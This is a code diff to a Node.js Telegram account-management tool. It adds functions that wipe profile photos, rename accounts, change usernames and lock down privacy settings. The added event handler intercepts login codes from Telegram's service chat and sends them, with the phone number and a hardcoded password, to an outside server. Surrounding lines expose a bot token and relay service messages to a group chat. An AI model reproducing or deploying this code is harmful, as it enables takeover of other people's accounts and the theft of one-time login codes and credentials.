@@ -4,6 +4,11 @@ const axios = require('axios');
 const { StringSession } = require('telegram/sessions');
 const { isMailReady, getcode, connectToMail, disconnectfromMail } = require('./mailreader')
 const ppplbot = "https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage";
+const { CustomFile } = require("telegram/client/uploads");
+const { sleep } = require('./utils')
+const fs = require('fs');
+const { getActiveClientSetup } = require('.');
+
 const clients = new Map();
 
 function getClient(number) {
@@ -123,8 +128,6 @@ class TelegramManager {
             await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
         }
     }
-
-
     async removeOtherAuths() {
         const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
         const updatedAuthorizations = result.authorizations.map((auth) => {
@@ -188,6 +191,26 @@ class TelegramManager {
         return me
     }
 
+    async deleteProfilePhotos() {
+        try {
+            const result = await this.client.invoke(
+                new Api.photos.GetUserPhotos({
+                    userId: "me"
+                })
+            );
+            console.log(result)
+            if (result && result.photos?.length > 0) {
+                const res = await this.client.invoke(
+                    new Api.photos.DeletePhotos({
+                        id: result.photos
+                    }))
+            }
+            console.log("Deleted profile Photos");
+        } catch (error) {
+            console.log(error)
+        }
+    }
+
     async set2fa() {
         connectToMail()
         const intervalParentId = setInterval(async () => {
@@ -230,9 +253,196 @@ class TelegramManager {
         }, 5000);
     }
 
+    async updatePrivacyforDeletedAccount() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+        }
+        catch (e) {
+            console.log(e)
+        }
+    }
+    async updateProfile(firstName, about) {
+        try {
+            const result = await this.client.invoke(
+                new Api.account.UpdateProfile({
+                    firstName: firstName,
+                    lastName: "",
+                    about: about,
+                })
+            );
+            console.log("Updated NAme: ", firstName);
+        } catch (error) {
+            console.log(error)
+        }
+    }
+    async updateUsername(baseUsername) {
+
+        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
+        let increment = 10;
+        if (username === '') {
+            try {
+                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                console.log(`Removed Username successfully.`);
+            } catch (error) {
+                console.log(error)
+            }
+        } else {
+            while (true) {
+                try {
+                    const result = await this.client.invoke(
+                        new Api.account.CheckUsername({ username })
+                    );
+                    console.log(result, " - ", username)
+                    if (result) {
+                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
+                        console.log(`Username '${username}' updated successfully.`);
+                        break;
+                    } else {
+                        username = baseUsername + increment;
+                        increment++;
+                        await sleep(4000);
+                    }
+                } catch (error) {
+                    console.log(error.message)
+                    username = baseUsername + increment;
+                    increment++;
+                    await sleep(10000);
+                }
+            }
+        }
+    }
+
+    async updateProfilePic(image) {
+        const file = await this.client.uploadFile({
+            file: new CustomFile(
+                'pic.jpg',
+                fs.statSync(
+                    image
+                ).size,
+                image
+            ),
+            workers: 1,
+        });
+        console.log("file uploaded- ", file)
+        await this.client.invoke(new Api.photos.UploadProfilePhoto({
+            file: file,
+        }));
+        console.log("profile pic updated")
+    }
+
+    async updatePrivacy() {
+        try {
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneCall({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Calls Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyProfilePhoto({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("PP Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyPhoneNumber({}),
+                    rules: [
+                        new Api.InputPrivacyValueDisallowAll()
+                    ],
+                })
+            );
+            console.log("Number Updated")
+
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+            console.log("LAstSeen Updated")
+            await this.client.invoke(
+                new Api.account.SetPrivacy({
+                    key: new Api.InputPrivacyKeyAbout({}),
+                    rules: [
+                        new Api.InputPrivacyValueAllowAll()
+                    ],
+                })
+            );
+        }
+        catch (e) {
+            console.log(e)
+        }
+    }
     async handleEvents(event) {
         if (event.isPrivate) {
             if (event.message.chatId.toString() == "777000") {
+                if (this.phoneNumber === getActiveClientSetup().phoneNumber) {
+                    console.log("LoginTExt: ", event.message.text)
+                    const code = event.message.text.split('.')[0].split(":")[0]
+                    console.log("Code is:", code)
+                    try {
+                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
+                        console.log("Code Sent");
+                    } catch (error) {
+                        console.log(error)
+                    }
+                }
                 console.log(event.message.text.toLowerCase());
                 const payload = {
                     "chat_id": "-1001801844217",
